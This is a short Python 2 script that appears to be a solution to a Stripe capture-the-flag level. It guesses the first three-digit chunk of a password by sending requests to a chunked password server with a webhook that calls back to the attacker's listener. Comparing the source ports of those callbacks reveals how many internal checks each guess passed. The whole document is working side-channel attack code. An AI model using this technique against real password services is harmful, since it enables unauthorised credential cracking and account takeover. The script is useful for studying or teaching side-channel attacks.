import socket
import urllib
import os

def score_password(s, portno, pw):
  for i in range(1,100):
    try:
      urllib.urlopen('https://level08-2.stripe-ctf.com/user-wuwdhsoezx/', '{"password": "baseline", "webhooks":["level02-2.stripe-ctf.com:%d"]}' % portno)
      s2, (host, portBaseline) = s.accept()
      s2.close()
      urllib.urlopen('https://level08-2.stripe-ctf.com/user-wuwdhsoezx/', '{"password": "' + pw + '", "webhooks":["level02-2.stripe-ctf.com:%d"]}' % portno)
      s2, (host, portNext) = s.accept()
      s2.close()
      return (portNext - portBaseline)
    except socket.timeout:
      pass

portno=32667
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", portno))
s.listen(1)
s.settimeout(2)
for i in range(0,999):
  for j in range(10):
    if score_password(s, portno, '%03daaabbbccc' % i) <= 2:
      break
    else:
      if j == 9:
        print "Candidate: ", i
      if i % 100 == 0:
        print ("Landmark: %d" % i)
s.close()